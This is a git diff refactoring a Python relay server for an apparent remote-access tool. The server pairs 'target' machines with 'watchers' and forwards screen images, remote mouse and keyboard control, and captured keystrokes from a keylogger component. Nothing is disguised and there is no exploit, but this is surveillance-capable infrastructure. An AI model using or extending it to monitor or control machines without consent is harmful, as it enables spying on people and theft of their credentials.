@@ -3,16 +3,18 @@ from Base.constants import ImageSendModes, Reasons, Actions, \
 from Base.settings import SERVER_PORT, SERVER_ADDRESS, WEB_SERVER_ADDRESS, \
     WEB_SERVER_PORT, ACKNOWLEDGEMENT_ITERATION, ADDRESS_TYPE, \
     IMAGE_SEND_MODE
-from Base.socket_base import Socket
+from Base.socket_base import Socket as BaseSocket
+from dataclasses import dataclass
 import errno
 from http.server import SimpleHTTPRequestHandler
 from io import BytesIO
 from queue import Queue
 import logging
 from PIL import Image, ImageChops, UnidentifiedImageError
+from random import random
 from socket import socket, SO_REUSEADDR, SOL_SOCKET
 from socketserver import TCPServer
-from threading import Thread
+from threading import Lock, Thread
 from time import sleep, time
 from typing import Dict
 
@@ -21,7 +23,17 @@ pil_logger = logging.getLogger("PIL")
 pil_logger.setLevel(logging.INFO)
 
 
-class Server(Socket):
+class Socket(BaseSocket):
+    def __init__(self, *args, **kwargs) -> None:
+        super().__init__(*args, **kwargs)
+
+        self.code: str = ""
+        self.watchers = 0
+        self.marked_for_stop = False
+        self.ready = False
+
+
+class Server(BaseSocket):
     """
     TODO: use a thread lock while incrementing or decrementing
         the `target.watchers` property
@@ -32,27 +44,13 @@ class Server(Socket):
 
         self.running = False
 
-        # List of access codes of all targets available for watching
-        self.targets: Dict[str, Socket] = {}
-
-        # Screen readers of all targets which are being watched
-        self.target_screens: Dict[str, Socket] = {}
-
-        # Controllers of all targets which are being watched
-        self.target_controllers: Dict[str, Socket] = {}
+        self.targets: Dict[str, Client] = {}
 
         # mapping for target and mouse events
         self.control_events: Dict[str, Queue[bytes]] = {}
 
-        # Target Key Loggers
-        self.target_keyloggers: Dict[str, Socket] = {}
-
         # access codes and sockets of all watchers
-        self.watchers: Dict[str, Socket] = {}
-
-        self.screen_watchers: Dict[str, Socket] = {}
-        self.controller_watchers: Dict[str, Socket] = {}
-        self.img = b""
+        self.watchers: Dict[str, Client] = {}
 
         self.file_server_running = False
         self.file_server = None
@@ -147,48 +145,85 @@ class Server(Socket):
                          "as it is already connected")
             client.socket.close()
             return
-        client.watchers = 0     # No. of watchers wathing this target
         client.code = code
         client.running = True
         client.status = Status.TARGET_WAITING
-        self.targets[code] = client
+        # self.main_targets[code] = client
+        lock = Lock()
+        target = Client(code, client, lock=lock)
+        self.targets[code] = target
         try:
-            # wait untill a watcher starts to watch
-            while client.status == Status.TARGET_WAITING and self.running:
-                client.send_data(b"WAIT")
+            client.send_data(b"OK")
+            while client.running and self.running:
+                with lock:
+                    client.send_data(Actions.WAIT)
                 sleep(1)
-            if self.running:
-                client.send_data(b"OK")
-                logging.info(f"Main target Client {code} Added")
+
         except (ConnectionResetError, BrokenPipeError):
             logging.info(f"Removing main target client {code}")
+
+        finally:
+            target.main = None
+
+            # wait for others to disconnect
+            while target.screen_reader or target.controller or \
+                    target.keylogger:
+                # logging.debug("Waiting for others to disconnect")
+                sleep(.1)
+            try:
+                client.send_data(Actions.DISCONNECT)
+            except (ConnectionResetError, BrokenPipeError):
+                pass
+            client.socket.close()
             del self.targets[code]
-        logging.info(f"Main target client {code} disconnected")
+            logging.info(f"Main target client {code} disconnected")
+
+    def accept_target_component(self, target: Socket, component: str):
+        """
+            Get the target code from the target component and check if
+            it is connected. If it is already connected, don't allow
+            the component to connect.
+        """
+        try:
+            code = target.recv_data().decode(self.FORMAT)
+            if code not in self.targets:
+                logging.info(f"Not allowing {component} to connect as "
+                             f"Main target client {code} is not connected")
+                target.send_data(Reasons.MAIN_NOT_CONNECTED)
+                target.socket.close()
+                return
+            if getattr(self.targets[code], component) is not None:
+                logging.info(f"Not allowing {component} {code} "
+                             "to connect as it is already connected")
+                target.send_data(Reasons.ALREADY_CONNECTED)
+                target.socket.close()
+                return
+            target.send_data(b"OK")
+        except (BrokenPipeError, ConnectionResetError):
+            return
+
+        logging.info(f"target {component} client connected")
+        return code
 
     def handle_target_screen_reader_client(self, target: Socket):
         """
             The `target` object has img object which is set to the image
             received from the target client.
         """
-        logging.info("target screen reader client connected")
-        code = target.recv_data().decode(self.FORMAT)
-        if code in self.target_screens:
-            logging.info("Not allowing target screen reader {code} "
-                         "to connect as it is already connected")
-            target.send_data(Reasons.ALREADY_CONNECTED)
-            target.socket.close()
-            return False
+        code = self.accept_target_component(target, "screen_reader")
+        if code is None:
+            return
+
         target.img = b""
         target.ready = False
-        self.target_screens[code] = target
-        target.send_data(b"OK")
+        self.targets[code].screen_reader = target
         running = True
         i = 0
         prev_img = None
 
         # while server is running and the target is connected and running
-        while running and self.running:
-            try:
+        try:
+            while running and self.running:
                 if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
                     target.img = target.recv_data()
                 elif IMAGE_SEND_MODE == ImageSendModes.DIFF:
@@ -204,49 +239,32 @@ class Server(Socket):
                     else:
                         img = ImageChops.subtract_modulo(prev_img, diff)
                     t4 = time()
-
-                    # diff = np.array(Image.open(bio))
-                    # if prev_img is None:
-                    #     img = diff
-                    # else:
-                    #     img = prev_img - diff
                     prev_img = img
-                    # img = Image.fromarray(img)
                     bio = BytesIO(b"")
                     img.save(bio, format="JPEG")
-                    # target.img = diff
                     target.img = bio.getvalue()
 
                     t5 = time()
                     logging.debug(f"{t2-t1}, {t3-t2}, {t4-t3}, {t5-t4}, {i}")
 
+                target.validity = random()
                 target.ready = True
                 i += 1
                 if i == ACKNOWLEDGEMENT_ITERATION:
                     target.send_data(b"OK")
                     i = 0
-                running = self.targets[code].running
+                running = self.targets[code].main is not None and not \
+                    target.marked_for_stop
 
-            except (BrokenPipeError, ConnectionResetError, KeyError,
-                    UnidentifiedImageError):
-                # client disconnected
-                logging.info(f"Removing target screen reader client {code}")
-                break
+        except (BrokenPipeError, ConnectionResetError, KeyError,
+                UnidentifiedImageError):
+            # client disconnected
+            logging.info(f"Removing target screen reader client {code}")
 
-        target.socket.close()
-        del self.target_screens[code]
-        self.remove_target(code)
-        logging.info(f"Target screen reader client {code} disconnected")
-
-    # fix this: all watchers disconnect when one of them disconnects
-    def remove_target(self, code):
-        """
-            removes target from `self.targets` if present.
-        """
-        if code in self.targets:
-            if self.targets[code].watchers > 0:
-                pass
-            del self.targets[code]
+        finally:
+            target.socket.close()
+            self.targets[code].screen_reader = None
+            logging.info(f"Target screen reader client {code} disconnected")
 
     def handle_target_controller_client(self, target: Socket):
         """
@@ -254,82 +272,67 @@ class Server(Socket):
             The watcher contoller will populate the queue.
             Fetch the control values from queue and send to target.
         """
-        code = target.recv_data().decode(self.FORMAT)
-        if code in self.target_controllers:
-            logging.info("Not allowing target controller {code} to "
-                         "connect as it is already connected")
-            target.send_data(Reasons.ALREADY_CONNECTED)
-            target.socket.close()
-            return False
-        logging.info("Target controller client connected")
-        self.target_controllers[code] = target
+        code = self.accept_target_component(target, "controller")
+        if code is None:
+            return
+
+        self.targets[code].controller = target
         self.control_events[code] = Queue(0)
-        target.send_data(b"OK")
 
         running = True
-        while running and self.running:
-
-            try:
+        try:
+            while running and self.running:
                 # handle control events
                 if not self.control_events[code].empty():
-                    # target.send_data(ControlDevice.CONTROL_MOUSE)
                     target.send_data(self.control_events[code].get())
-                    # target.recv_data()    # reveive 'OK'
-            except (BrokenPipeError, ConnectionResetError):
-                logging.info(f"Connection to target controller client {code} "
-                             "failed unexpectedly. Removing it.")
-                break
+                running = self.targets[code].main is not None and \
+                    not target.marked_for_stop
+                sleep(0.001)
+        except (BrokenPipeError, ConnectionResetError):
+            logging.info(f"Connection to target controller client {code} "
+                         "failed unexpectedly. Removing it.")
 
-            try:
-                running = self.targets[code].running
-            except KeyError:
-                break
-            sleep(0.0001)
-
-        target.socket.close()
-        del self.target_controllers[code]
-        if code in self.targets:
-            self.targets[code].running = False
-        logging.info(f"Target controller client {code} disconnected")
+        finally:
+            target.socket.close()
+            self.targets[code].controller = None
+            logging.info(f"Target controller client {code} disconnected")
 
     def handle_target_keylogger_client(self, target: Socket):
         """
             Get the logged keys from the target. Wait till they are fetched
             by watcher and then get the next keys.
+
+            TODO: This supports only one watcher at a time. Use a queue on
+                  watcher client and populate each queue with received vks.
         """
-        logging.info(f"Target keylogger client connected")
-        code = target.recv_data().decode(self.FORMAT)
-        if code in self.target_controllers:
-            logging.info("Not allowing target controller {code} to "
-                         "connect as it is already connected")
-            target.send_data(Reasons.ALREADY_CONNECTED)
-            target.socket.close()
-            return False
+        code = self.accept_target_component(target, "keylogger")
+        if code is None:
+            return
+
         target.ready = False
-        self.target_keyloggers[code] = target
-        target.send_data(b'OK')
-        
+        self.targets[code].keylogger = target
+
         running = True
-        while running and self.running:
-            try:
+        try:
+            while running and self.running:
+                running = self.targets[code].main is not None and \
+                          not target.marked_for_stop
                 if target.ready:
+                    sleep(0.1)
                     continue
-                target.vks = target.recv_data()
+                data = target.recv_data()
+                if data == Actions.WAIT:
+                    continue
+                target.vks = data
                 target.ready = True
 
-            except (BrokenPipeError, ConnectionResetError):
-                logging.info(f"Connection to target keylogger client {code} "
-                             "failed unexpectedly. Removing it.")
-                break
-
-            try:
-                running = self.targets[code].running
-            except KeyError:
-                break
-            sleep(0.1)
-        del self.target_keyloggers[code]
-        logging.info("Target keylogger client {code} disconnected")
-
+        except (BrokenPipeError, ConnectionResetError):
+            logging.info(f"Connection to target keylogger client {code} "
+                         "failed unexpectedly. Removing it.")
+        finally:
+            target.socket.close()
+            self.targets[code].keylogger = None
+            logging.info(f"Target keylogger client {code} disconnected")
 
     def handle_main_watcher_client(self, watcher: Socket):
         """
@@ -342,206 +345,268 @@ class Server(Socket):
         try:
             code = watcher.recv_data().decode(self.FORMAT)
             if code in self.watchers:
-                logging.info("Not allowing watcher {code} "
+                logging.info(f"Not allowing watcher {code} "
                              "to connect as it is already connected")
                 watcher.send_data(Reasons.ALREADY_CONNECTED)
                 watcher.socket.close()
                 return False
             watcher.send_data(b"OK")
-            self.watchers[code] = watcher
+            # self.watchers[code] = watcher
         except (BrokenPipeError, ConnectionResetError):
             logging.info(f"Connection to Main Watcher {code} "
                          "failed unexpectedly. Removing it.")
-            self.remove_watcher(code)
             return
 
-        while self.running:
-            try:
+        lock = Lock()
+        client = Client(code, watcher, lock=lock)
+        self.watchers[code] = client
+
+        try:
+            while self.running:
                 request = watcher.recv_data()
                 if request == Actions.SEND_TARGET_LIST:
                     watcher.send_data(str(list(self.targets.keys()))
                                       .encode(self.FORMAT))
-                # elif request == WATCH_BY_CODE:
-                #     target_code = watcher.recv_data().decode(self.FORMAT)
-                #     if not target_code:
-                #         del self.watchers[code]
-                #         return
-                #     target = self.targets[target_code]
-                #     watcher.target = target
-                #     target.running = True
-                #     target.watchers += 1
-                #     target.status = TARGET_RUNNING
-
-                elif request == Actions.STOP_WATCHING:
-                    """
-                        TODO: decrement target.watcher after
-                            screen_reader deletes itself
-                    """
-                    watcher.running = False
-
-                    """
-                        sleep for 2 seconds so that screen_reader
-                        and controller disconnect themselves
-                    """
-                    sleep(2)
 
                 elif request == Actions.DISCONNECT or request == b"":
-                    watcher.socket.close()
-                    self.remove_watcher(code)
+                    break
+
+                elif request == Actions.SEND_CONNECTED_COMPONENTS:
+                    target_code = watcher.recv_data().decode(self.FORMAT)
+                    if target_code in self.targets:
+                        target = self.targets[target_code]
+                        watcher.send_data(str([
+                            target.main is not None,
+                            target.screen_reader is not None,
+                            target.controller is not None,
+                            target.keylogger is not None
+                        ]).encode(self.FORMAT))
+                    else:
+                        watcher.send_data(str([False]*4).encode(self.FORMAT))
 
                 else:
                     raise Exception(f"Request '{request}' not defined!")
-            except (BrokenPipeError, ConnectionResetError, OSError):
-                logging.info(f"Connection to Main Watcher {code} "
-                             "closed. Removing it.")
-                self.remove_watcher(code)
-                break
-        logging.info(f"Main watcher client {code} disconnected")
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            logging.info(f"Connection to Main Watcher {code} "
+                         "closed. Removing it.")
+        finally:
+            client.main = None
+            watcher.socket.close()
 
-    def remove_watcher(self, code: str):
-        """
-            After main watcher is removed screen reader
-            and controller automatically remove themselves
-        """
-        if code in self.watchers:
+            while client.controller or client.screen_reader or \
+                    client.keylogger:
+                sleep(.1)
+
             del self.watchers[code]
+            logging.info(f"Main watcher client {code} disconnected")
+
+    def accept_watcher_component(self, watcher: Socket, component: str):
+        """
+        Gets the watcher code and target code from the watcher component.
+        Does not let the component connect if it is already connected.
+        """
+        try:
+            code = watcher.recv_data().decode(self.FORMAT)
+            if code not in self.watchers:
+                logging.info(f"Not allowing {component} to connect as "
+                             f"Main watcher client {code} is not connected")
+                watcher.send_data(Reasons.MAIN_NOT_CONNECTED)
+                watcher.socket.close()
+                return
+            if getattr(self.watchers[code], component) is not None:
+                logging.info(f"Not allowing watcher {component} {code} "
+                             "to connect as it is already connected")
+                watcher.send_data(Reasons.ALREADY_CONNECTED)
+                watcher.socket.close()
+                return
+            target_code = watcher.recv_data().decode(self.FORMAT)
+            if target_code not in self.targets or \
+                    self.targets[target_code].main is None:
+                logging.info(f"The main target to be watched {code}"
+                             " is not connected")
+                return
+            watcher.send_data(b"OK")
+        except (BrokenPipeError, ConnectionResetError):
+            logging.debug(f"Watcher {component} disconnected. "
+                          "Removing it and stopping watching")
+            return
+        logging.info(f"Watcher {component} client connected")
+        return code, target_code
 
     def handle_watcher_screen_reader_client(self, watcher: Socket):
         """
             Screen reader connects to the server and sends
             target images to the watcher.
         """
-        logging.info(f"Watcher screen reader client connected")
-        try:
-            code = watcher.recv_data().decode(self.FORMAT)
-            target_code = watcher.recv_data().decode(self.FORMAT)
-            watcher.send_data(b"OK")
-        except (BrokenPipeError, ConnectionResetError):
-            logging.debug("Watcher screen reader disconnected. "
-                          "Removing it and stopping watching")
+
+        codes = self.accept_watcher_component(watcher, "screen_reader")
+        if codes is None:
             return
 
+        code, target_code = codes
+
         # get the main target object
-        target = self.targets[target_code]
-        target.watchers += 1
-        target.running = True
-        target.status = Status.TARGET_RUNNING
+        target = self.targets[target_code].main
+        with self.targets[target_code].lock:
+            target.send_data(Actions.START_SCREEN_READER)
 
         # wait for the target screen to connect
-        while target_code not in self.target_screens:
-            logging.debug("Waiting for target screen to connect")
-            sleep(0.1)
-        logging.debug("Getting target screen")
-        target_screen = self.target_screens[target_code]
+        i = 0
+        try:
+            while self.targets[target_code].screen_reader is None:
+                logging.debug("Waiting for target screen to connect")
+                sleep(0.1)
+                i += 1
+                if i == 100:
+                    logging.info(f"Target screen reader did not connect"
+                                f" in a reasonable time. stopping {code} "
+                                "screen reader")
+                    watcher.socket.close()
+                    self.watchers[code].screen_reader = None
+                    logging.info(f"Watcher screen reader client {code} "
+                                "disconnected")
+                    return
+        except KeyError:
+            watcher.socket.close()
+            self.watchers[code].screen_reader = None
+            logging.info(f"Watcher screen reader client {code} disconnected")
+            return
+        target_screen = self.targets[target_code].screen_reader
+        target_screen.watchers += 1
+        self.watchers[code].screen_reader = watcher
+
         while not target_screen.ready:
             sleep(0.1)
         running = True
-        logging.debug(f"{self.targets[target_code].watchers} "
-                      "watchers connected")
-        self.watchers[code].running = True
         i = 0
-        while running and self.running:
-            try:
-                if target_code not in self.targets:
-                    watcher.socket.close()
-                    break
-                while not target_screen.ready:
+        last_validity = -1
+        try:
+            while running and self.running:
+                running = self.watchers[code].main is not None and \
+                    target_code in self.targets and \
+                    self.targets[target_code].screen_reader is not None
+                validity = target_screen.validity
+                if last_validity == validity:
                     sleep(0.01)
-                target.ready = False
+                    continue
+                last_validity = validity
                 watcher.send_data(target_screen.img)
                 i += 1
                 if i == ACKNOWLEDGEMENT_ITERATION:
                     watcher.recv_data()  # receive acknowledgement
                     i = 0
                 sleep(0.01)
-            except (BrokenPipeError, ConnectionResetError):
-                logging.debug("Screen reader disconnected. Removing "
-                              "it and stopping watching")
-                break
-            try:
-                running = self.watchers[code].running
-            except KeyError:
-                logging.debug("Watcher disconnected. Removing screen reader")
-                watcher.socket.close()
-                break
-
-        # decrement `target.watchers` when disconnecting.
-        # Remove the target if `target.watchers` becomes 0
-        if target_code in self.targets:
-            self.targets[target_code].watchers -= 1
-            if (self.targets[target_code].watchers == 0):
-                self.targets[target_code].running = False
-                logging.info(f"Removing target screen reader client {code} "
-                             "as no watcher is watching it.")
-        logging.info(f"Watcher screen reader client {code} disconnected")
+        except (BrokenPipeError, ConnectionResetError):
+            pass
+        finally:
+            if target_code in self.targets:
+                with self.targets[target_code].lock:
+                    target_screen.watchers -= 1
+                    if target_screen.watchers == 0:
+                        target_screen.marked_for_stop = True
+            watcher.socket.close()
+            self.watchers[code].screen_reader = None
+            logging.info(f"Watcher screen reader client {code} disconnected")
 
     def handle_watcher_controller_client(self, watcher: Socket):
         """
             Gets the controller request for the given watcher and forwards
             it to the `handle_watcher_controllers` method.
+
+            TODO: When target controller is disconnected, this method does not
+                  return until there is one extra event from the watcher.
+                  Sol: Keep receiving `Actions.WAIT`. But this may make
+                  controlling slow.
         """
-        logging.info(f"Watcher controller client connected")
-        try:
-            code = watcher.recv_data().decode(self.FORMAT)
-            target_code = watcher.recv_data().decode(self.FORMAT)
-            watcher.send_data(b"OK")
-        except (BrokenPipeError, ConnectionResetError):
-            logging.debug("Watcher screen reader disconnected. Removing it "
-                          "and stopping watching")
+
+        codes = self.accept_watcher_component(watcher, "controller")
+        if codes is None:
             return
 
+        code, target_code = codes
+
+        # get the main target object
+        target = self.targets[target_code].main
+        with self.targets[target_code].lock:
+            target.send_data(Actions.START_CONTROLLER)
+
+        try:
+            while self.targets[target_code].controller is None:
+                sleep(0.1)
+        except KeyError:
+            watcher.socket.close()
+            self.watchers[code].controller = None
+            logging.info(f"Watcher controller client {code} disconnected")
+            return
+
+        target_controller = self.targets[target_code].controller
+        target_controller.watchers += 1
+        self.watchers[code].controller = watcher
+
         running = True
-        while running and self.running:
-            try:
-                if target_code not in self.targets:
-                    watcher.socket.close()
+        try:
+            while running and self.running:
+                if target_code not in self.targets or \
+                        self.targets[target_code].controller is None:
                     break
-                # self.handle_watcher_controllers(watcher, target_code)
+                running = self.watchers[code].main is not None
                 event = watcher.recv_data()
+                if event == Actions.DISCONNECT:
+                    break
+                if event == Actions.WAIT:
+                    continue
                 if target_code in self.control_events:
                     self.control_events[target_code].put(event)
-            except (BrokenPipeError, ConnectionResetError):
-                logging.debug("Controller disconnected. Removing it and "
-                              "stopping watching")
-                break
-
-            try:
-                running = self.watchers[code].running
-            except KeyError:
-                logging.debug("Watcher disconnected. Removing controller")
-                watcher.socket.close()
-                break
-        logging.info(f"Watcher controller client {code} disconnected")
+        except (BrokenPipeError, ConnectionResetError):
+            pass
+        finally:
+            if target_code in self.targets:
+                with self.targets[target_code].lock:
+                    target_controller.watchers -= 1
+                    if target_controller.watchers == 0:
+                        target_controller.marked_for_stop = True
+            watcher.socket.close()
+            self.watchers[code].controller = None
+            logging.info(f"Watcher controller client {code} disconnected")
 
     def handle_watcher_keylogger_client(self, watcher: Socket):
         """
         Sends target keystrokes to the watcher
         """
 
-        logging.info(f"Watcher keylogger client connected")
-        try:
-            code = watcher.recv_data().decode(self.FORMAT)
-            target_code = watcher.recv_data().decode(self.FORMAT)
-            watcher.send_data(b"OK")
-        except (BrokenPipeError, ConnectionResetError):
-            logging.debug("Watcher keylogger disconnected. Removing it "
-                          "and stopping watching")
+        codes = self.accept_watcher_component(watcher, "keylogger")
+        if codes is None:
             return
 
-        # wait for the target keylogger to connect
-        while target_code not in self.target_keyloggers:
-            logging.debug("Waiting for target keylogger to connect")
-            sleep(0.2)
-        logging.debug("Target keylogger connected")
-        target_keylogger = self.target_keyloggers[target_code]
+        code, target_code = codes
+
+        # get the main target object
+        target = self.targets[target_code].main
+        with self.targets[target_code].lock:
+            target.send_data(Actions.START_KEYLOGGER)
+
+        try:
+            while self.targets[target_code].keylogger is None:
+                sleep(0.1)
+        except KeyError:
+            watcher.socket.close()
+            self.watchers[code].controller = None
+            logging.info(f"Watcher keylogger client {code} disconnected")
+            return
+
+        logging.debug("Watcher keylogger connected")
+        target_keylogger = self.targets[target_code].keylogger
+        target_keylogger.watchers += 1
+        self.watchers[code].keylogger = watcher
 
         running = True
-        while running and self.running:
-            try:
-                if target_code not in self.targets:
-                    watcher.socket.close()
+        try:
+            while running and self.running:
+                if target_code not in self.targets or \
+                        self.targets[target_code].keylogger is None:
                     break
 
+                running = self.watchers[code].main is not None
                 if not target_keylogger.ready:
                     sleep(0.1)
                     continue
@@ -549,32 +614,18 @@ class Server(Socket):
                 vks = target_keylogger.vks
                 target_keylogger.ready = False
                 watcher.send_data(vks)
-            except (BrokenPipeError, ConnectionResetError):
-                logging.debug("Keylogger disconnected. Removing it and "
-                              "stopping watching")
-                break
+        except (BrokenPipeError, ConnectionResetError):
+            pass
 
-            try:
-                running = self.watchers[code].running
-            except KeyError:
-                logging.debug("Watcher disconnected. Removing keylogger")
-                watcher.socket.close()
-                break
-        logging.info(f"Watcher keylogger client {code} disconnected")
-
-    # def handle_watcher_controllers(self, watcher: Socket, target_code):
-    #     """
-    #         All kinds of controller requests are handled here.
-    #     """
-    #     # control_type = watcher.recv_data()
-
-    #     # handle controller requests
-    #     # if control_type == ControlDevice.CONTROL_MOUSE:
-    #     event = watcher.recv_data()
-    #     if target_code in self.target_controllers:
-    #         self.control_events[target_code].put(event)
-
-    #     # watcher.send_data(b"OK")
+        finally:
+            if target_code in self.targets:
+                with self.targets[target_code].lock:
+                    target_keylogger.watchers -= 1
+                    if target_keylogger.watchers == 0:
+                        target_keylogger.marked_for_stop = True
+            watcher.socket.close()
+            self.watchers[code].keylogger = None
+            logging.info(f"Watcher keylogger client {code} disconnected")
 
     def start_file_server(self, path):
         """
@@ -600,6 +651,16 @@ class Server(Socket):
             self.file_server.shutdown()
         self.running = False
         self.socket.close()
+
+
+@dataclass
+class Client(object):
+    code: str = None
+    main: Socket = None
+    screen_reader: Socket = None
+    keylogger: Socket = None
+    controller: Socket = None
+    lock: Lock = None
 
 
 class CustomTCPServer(TCPServer):
